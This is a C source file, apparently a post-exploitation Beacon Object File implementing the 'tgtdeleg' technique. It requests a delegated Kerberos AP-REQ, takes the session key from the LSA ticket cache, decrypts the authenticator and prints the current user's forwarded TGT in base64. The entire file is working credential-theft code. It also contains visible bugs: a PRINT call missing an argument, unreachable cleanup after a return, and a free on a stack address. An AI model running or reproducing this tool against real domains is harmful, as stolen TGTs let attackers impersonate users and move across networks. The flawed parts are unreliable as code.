#include "tgtdeleg.h"

LONG RequestApReq(char* spn, PUCHAR* apreq, PULONG apreqSize, BOOL checkDelegate) {
    CredHandle hCred;
    TimeStamp timeStamp;
    SECURITY_STATUS status = SECUR32$AcquireCredentialsHandleA(NULL, "Kerberos", SECPKG_CRED_OUTBOUND, NULL, NULL, 0,
                                                               NULL, &hCred, &timeStamp);
    if (status == SEC_E_OK) {
        CtxtHandle hCtx;
        SecBuffer secBuf = {0, SECBUFFER_TOKEN, NULL};
        SecBufferDesc secBufDesc = {SECBUFFER_VERSION, 1, &secBuf};
        ULONG contextAttr;
        status = SECUR32$InitializeSecurityContextA(
            &hCred, NULL, (SEC_CHAR*)spn, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0,
            SECURITY_NATIVE_DREP, NULL, 0, &hCtx, &secBufDesc, &contextAttr, NULL);
        if (status == SEC_E_OK || status == SEC_I_CONTINUE_NEEDED) {
            BOOL condition = checkDelegate ? (contextAttr & ISC_REQ_DELEGATE) : TRUE;
            if (condition) {
                PUCHAR out = (PUCHAR)MSVCRT$calloc(secBuf.cbBuffer, sizeof(UCHAR));
                if (out != NULL) {
                    MSVCRT$memcpy(out, secBuf.pvBuffer, secBuf.cbBuffer);
                    *apreq = out;
                    *apreqSize = secBuf.cbBuffer;
                    if (secBuf.pvBuffer) {
                        SECUR32$FreeContextBuffer(secBuf.pvBuffer);
                    }
                    status = 0;
                } else {
                    status = STATUS_MEMORY_NOT_ALLOCATED;
                }
                SECUR32$DeleteSecurityContext(&hCtx);
            } else {
                status = SEC_E_TARGET_UNKNOWN;  // not allowed to delegate
            }
        }
        SECUR32$FreeCredentialsHandle(&hCred);
    }
    return status;
}

NTSTATUS GetKeyFromCache(HANDLE hToken, char* target, LONG encType, PUCHAR* key, PULONG keySize) {
    HANDLE hLsa;
    *key = NULL;
    NTSTATUS status = GetLsaHandle(hToken, FALSE, &hLsa);
    if (NT_SUCCESS(status)) {
        ULONG authPackage;
        LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
        status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
        if (NT_SUCCESS(status)) {
            WCHAR* wTarget = GetWideString(target);
            if (wTarget != NULL) {
                USHORT dwTarget = (MSVCRT$wcslen(wTarget) + 1) * sizeof(WCHAR);
                ULONG requestSize = dwTarget + sizeof(KERB_RETRIEVE_TKT_REQUEST);
                PKERB_RETRIEVE_TKT_REQUEST request =
                    (PKERB_RETRIEVE_TKT_REQUEST)MSVCRT$calloc(requestSize, sizeof(KERB_RETRIEVE_TKT_REQUEST));
                if (request != NULL) {
                    request->MessageType = KerbRetrieveEncodedTicketMessage;
                    request->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
                    request->EncryptionType = encType;
                    request->TargetName.Length = dwTarget - sizeof(WCHAR);
                    request->TargetName.MaximumLength = dwTarget;
                    request->TargetName.Buffer = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
                    MSVCRT$memcpy(request->TargetName.Buffer, wTarget, request->TargetName.MaximumLength);
                    PKERB_RETRIEVE_TKT_RESPONSE response;
                    NTSTATUS protocolStatus;
                    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, &response,
                                                                  &requestSize, &protocolStatus);
                    MSVCRT$free(request);
                    if (NT_SUCCESS(status)) {
                        if (NT_SUCCESS(protocolStatus)) {
                            if (requestSize > 0) {
                                char* out = (char*)MSVCRT$calloc(response->Ticket.SessionKey.Length, sizeof(char));
                                if (out != NULL) {
                                    MSVCRT$memcpy(out, response->Ticket.SessionKey.Value,
                                                  response->Ticket.SessionKey.Length);
                                    *key = out;
                                    *keySize = response->Ticket.SessionKey.Length;
                                } else {
                                    status = STATUS_MEMORY_NOT_ALLOCATED;
                                }
                                SECUR32$LsaFreeReturnBuffer(&response);
                            } else {
                                status = ADVAPI32$LsaNtStatusToWinError(status);
                            }
                        } else {
                            status = ADVAPI32$LsaNtStatusToWinError(status);
                        }
                    } else {
                        status = ADVAPI32$LsaNtStatusToWinError(status);
                    }
                } else {
                    status = STATUS_MEMORY_NOT_ALLOCATED;
                }
                MSVCRT$free(wTarget);
            } else {
                status = STATUS_MEMORY_NOT_ALLOCATED;
            }
        } else {
            status = ADVAPI32$LsaNtStatusToWinError(status);
        }
        SECUR32$LsaDeregisterLogonProcess(hLsa);
    }

    return status;
}

NTSTATUS KerberosDecrypt(DWORD keyUsage, KERB_ENCRYPTION_KEY* key, ASN1octetstring_t* in, ASN1octetstring_t* out) {
    NTSTATUS status;
    PKERB_ECRYPT pEcrypt;
    PVOID pContext;

    status = CRYPTDLL$CDLocateCSystem(key->keytype, &pEcrypt);
    if (status == 0) {
        status = pEcrypt->Initialize(key->keyvalue.value, key->keyvalue.length, keyUsage, &pContext);
        if (status == 0) {
            out->length = in->length;
            out->value = KERNEL32$LocalAlloc(LPTR, out->length);
            if (out->value != NULL) {
                status = pEcrypt->Decrypt(pContext, in->value, in->length, out->value, (DWORD*)&out->length);
                if (status != 0) {
                    KERNEL32$LocalFree(out->value);
                    out->value = NULL;
                }
            } else {
                status = KERNEL32$GetLastError();
            }
            pEcrypt->Finish(&pContext);
        }
    }

    return status;
}

// kekeo/modules/kull_m_memory.c
PVOID MemorySearch(LPCVOID pattern, SIZE_T pSize, LPCVOID buf, SIZE_T bSize) {
    BOOL status = FALSE;
    PBYTE result = NULL;
    PBYTE current = (PBYTE)buf + bSize;
    PBYTE limit = current;

    for (current = (PBYTE)buf; !status && (current + pSize <= limit); current++) {
        status = !MSVCRT$memcmp(pattern, current, pSize);
    }
    if (status) {
        result = current - 1;
    }
    return result;
}

PBYTE SearchOID(LPCVOID data, SIZE_T size) {
    byte krbv5[] = {0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02}; /* 1.2.840.113554.1.2.2 */
    PBYTE res = (PBYTE)MemorySearch(krbv5, 11, data, size);
    if (res != NULL) {
        res += 11;
    }
    return res;
}

void execute_tgtdeleg(WCHAR** dispatch, HANDLE hToken, char* spn) {
    PUCHAR apreq;
    ULONG apreqSize;
    LONG status = RequestApReq(spn, &apreq, &apreqSize, TRUE);
    if (status == 0) {
        PBYTE tokID = SearchOID(apreq, apreqSize);
        if (*(PUSHORT)tokID == 0x0001) {
            PRINT(dispatch, "[*] Found the AP-REQ delegation ticket in the GSS-API output\n");
            PKERB_AP_REQUEST apRequest;
            KERBERR kerbError;
            apreqSize -= (LONG)(tokID - (PBYTE)apreq);
            ASN1module_t module = KRB5_Module_Startup();
            if (module != NULL) {
                kerbError = KerbUnpackData(module, tokID + sizeof(SHORT), apreqSize, KERB_AP_REQUEST_PDU, &apRequest);
                if (KERB_SUCCESS(kerbError)) {
                    int apReqAuthType = apRequest->authenticator.encryption_type;
                    PRINT(dispatch, "[*] Authenticator etype: %s\n", GetEncryptionTypeString(apReqAuthType));
                    PUCHAR key;
                    ULONG keySize;
                    status = GetKeyFromCache(hToken, spn, apReqAuthType, &key, &keySize);
                    if (NT_SUCCESS(status)) {
                        PRINT(dispatch, "[*] Successfully extracted the service ticket session key\n");
                        ASN1octetstring_t authenticatorPacked;
                        KERB_ENCRYPTION_KEY encKey = {
                            .keytype = apReqAuthType, .keyvalue.length = keySize, .keyvalue.value = key};
                        status = KerberosDecrypt(KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &encKey,
                                                 &apRequest->authenticator.cipher_text, &authenticatorPacked);
                        if (NT_SUCCESS(status)) {
                            PRINT(dispatch, "[*] Successfully decrypted authenticator\n");
                            KERB_AUTHENTICATOR* authenticator;
                            kerbError = KerbUnpackData(module, authenticatorPacked.value, authenticatorPacked.length,
                                                       KERB_AUTHENTICATOR_PDU, &authenticator);
                            if (KERB_SUCCESS(kerbError)) {
                                if (authenticator->bit_mask & checksum_present) {
                                    // GSS_CHECKSUM_TYPE
                                    if (authenticator->checksum.checksum_type == 0x8003) {
                                        KERB_GSS_CHECKSUM* checksum =
                                            (KERB_GSS_CHECKSUM*)authenticator->checksum.checksum.value;
                                        // GSS_C_DELEG_FLAG
                                        if (checksum->GssFlags & 0x01) {
                                            KERB_CRED* cred;
                                            kerbError =
                                                KerbUnpackData(module, checksum->DelegationInfo,
                                                               checksum->DelegationLength, KERB_CRED_PDU, &cred);
                                            if (KERB_SUCCESS(kerbError)) {
                                                status = KerberosDecrypt(KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, &encKey,
                                                                         &cred->encrypted_part.cipher_text,
                                                                         &authenticatorPacked);
                                                if (NT_SUCCESS(status)) {
                                                    cred->encrypted_part.encryption_type = 0;
                                                    cred->encrypted_part.cipher_text =
                                                        *(ASN1octetstring_t*)&authenticatorPacked;
                                                    PUCHAR encodedData;
                                                    ULONG encodedSize;
                                                    kerbError = KerbPackData(module, cred, KERB_CRED_PDU, &encodedSize,
                                                                             &encodedData);
                                                    if (KERB_SUCCESS(kerbError)) {
                                                        int b64Len = Base64encode_len(encodedSize);
                                                        char* encoded = (char*)MSVCRT$calloc(b64Len, sizeof(char));
                                                        if (encoded != NULL) {
                                                            Base64encode(encoded, encodedData, encodedSize);
                                                            PRINT(dispatch, "[+] Successfully extracted TGT: %s\n",
                                                                  encoded);
                                                            return;
                                                            MSVCRT$free(encoded);
                                                        } else {
                                                            PRINT(dispatch, "[!] Could not allocate memory.\n");
                                                        }
                                                        MSVCRT$free(encodedData);
                                                    } else {
                                                        PRINT(dispatch, "[!] Failed to pack plain KRB_CRED: 0x%x\n",
                                                              kerbError);
                                                    }
                                                } else {
                                                    PRINT(dispatch, "[!] Failed to decrypt KRB_CRED: 0x%x\n", status);
                                                }
                                                KerbFreeData(module, KERB_CRED_PDU, cred);
                                            } else {
                                                PRINT(dispatch, "[!] Failed to unpack KRB_CRED\n");
                                            }
                                        } else {
                                            PRINT(dispatch, "[!] Missing delegation flag\n");
                                        }
                                    } else {
                                        PRINT(dispatch, "[!] Wrong checksum type\n");
                                    }
                                } else {
                                    PRINT(dispatch, "[!] Missing checksum in the authentticator\n");
                                }
                                KerbFreeData(module, KERB_AUTHENTICATOR_PDU, authenticator);
                            } else {
                                PRINT("[!] Failed to unpack authenticator: 0x%x\n", kerbError);
                            }
                            MSVCRT$free(&authenticatorPacked);
                        } else {
                            PRINT(dispatch, "[!] Unable to decrypt authenticator: 0x%x\n", status);
                        }
                        MSVCRT$free(key);
                    } else {
                        PRINT(dispatch, "[!] Could not obtain the key from cache: 0x%x\n", status);
                    }
                    KerbFreeData(module, KERB_AP_REQUEST_PDU, apRequest);
                } else {
                    PRINT(dispatch, "[!] Failed to unpack AP-REQ: 0x%x\n", kerbError);
                }
                KRB5_Module_Cleanup(module);
            } else {
                PRINT(dispatch, "[!] Could not create ASN.1 module\n");
            }
            MSVCRT$free(apreq);
        } else {
            PRINT(dispatch, "[!] Kerberos OID not found\n");
        }
    } else {
        PRINT(dispatch, "[!] Failed to request AP-REQ: 0x%x\n", status);
    }
}